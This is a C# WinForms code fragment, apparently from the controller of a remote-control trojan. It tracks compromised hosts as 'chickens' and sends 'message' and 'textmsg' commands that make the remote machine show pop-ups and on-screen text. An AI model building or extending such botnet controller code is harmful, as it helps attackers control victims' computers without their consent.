        {

        }

        private void button8_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        { 
            string returnString = null;
            CommentSend("发送窗口消息", "message " + textBox6.Text + "\n" + textBox5.Text + "\n" + comboBox3.Text + "\n" + comboBox1.Text, out returnString);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBoxButtons m = MessageBoxButtons.OK;
            MessageBoxIcon ico = MessageBoxIcon.Information;
            switch (comboBox1.Text)
            {
                case "普通": ico = MessageBoxIcon.Information; break;
                case "询问": ico = MessageBoxIcon.Question; break;
                case "错误": ico = MessageBoxIcon.Error; break;
                case "警告": ico = MessageBoxIcon.Warning; break;
            }
            switch (comboBox3.Text)
            {
                case "确定": m = MessageBoxButtons.OK; break;
                case "确定、取消": m = MessageBoxButtons.OKCancel; break;
                case "是、否": m = MessageBoxButtons.YesNo; break;
                case "是、否、取消": m = MessageBoxButtons.YesNoCancel; break;
                case "重试、取消": m = MessageBoxButtons.RetryCancel; break;
                case "终止、重试、忽略": m = MessageBoxButtons.AbortRetryIgnore; break;
            }
            MessageBox.Show(textBox6.Text,textBox5.Text,m,ico);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string returnString = null;
            CommentSend("发送文本消息", "textmsg " + textBox8.Text + "\n" + textBox7.Text + "\n" + textBox14.Text + "\n" + comboBox5.Text + "\n" + comboBox7.Text+"\n"+comboBox8.Text, out returnString);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            System.Drawing.Text.InstalledFontCollection MyFamilies = new System.Drawing.Text.InstalledFontCollection(); 
            FontForm ff = new FontForm();
            ff.label1.Text = textBox8.Text;
            ff.label1.Location = new Point(int.Parse(textBox7.Text),int.Parse(textBox14.Text));
            ff.label1.Font = new Font(new FontFamily(comboBox5.Text), int.Parse(comboBox7.Text));
            ff.label1.ForeColor = Color.FromName(comboBox8.Text);
            ff.Show();
        }

        private void comboBox5_DropDown(object sender, EventArgs e)
        {
            //初始化字体
            System.Drawing.Text.InstalledFontCollection MyFamilies = new System.Drawing.Text.InstalledFontCollection();
            foreach (FontFamily family in MyFamilies.Families)
            {
                this.comboBox5.Items.Add(family.Name);
            }
        }

        private void comboBox8_DrawItem(object sender, DrawItemEventArgs e)
        {
            //初始化颜色
            Rectangle r = e.Bounds;
            Color clo = Color.FromName(comboBox8.Items[e.Index].ToString());

            SolidBrush brush = new SolidBrush(clo);

            e.Graphics.FillRectangle(Brushes.AliceBlue, e.Bounds);

            e.Graphics.DrawString(comboBox8.Items[e.Index].ToString(), myFont, brush, new Point(25, e.Bounds.Y));
            e.Graphics.FillRectangle(brush, e.Bounds.X, e.Bounds.Y + 1, 18, 18);

            if ((e.State & DrawItemState.Focus) == 0)
            {
                e.Graphics.FillRectangle(Brushes.White, e.Bounds);

                e.Graphics.DrawString(comboBox8.Items[e.Index].ToString(), myFont, brush, new Point(25, e.Bounds.Y));
                e.Graphics.FillRectangle(brush, e.Bounds.X, e.Bounds.Y + 1, 18, 18);
            }	
        }
        private bool CommentSend(string caozuo, string command, out string returnString)
        {
            returnString = null;
            if (chickens.CurrentChicken == null || isLocal)
            {
                this.statusBarPanel2.Text = "远程主机没有连接或已断开连接," + caozuo + "失败";
                return false;
            }
            statusBarPanel2.Text = "正在" + caozuo;
            if (!chickens.CurrentChicken.WriteToServer(command))
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接," + caozuo + "失败";
                return false;
            }
            bool isConnected = true;
            string str = chickens.CurrentChicken.ReadFromServer(out isConnected);
            if (!isConnected)
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接," + caozuo + "失败";
                return false;
            }
            statusBarPanel2.Text = caozuo + "成功";
            returnString = str;
            return true;
        }
        
    }
}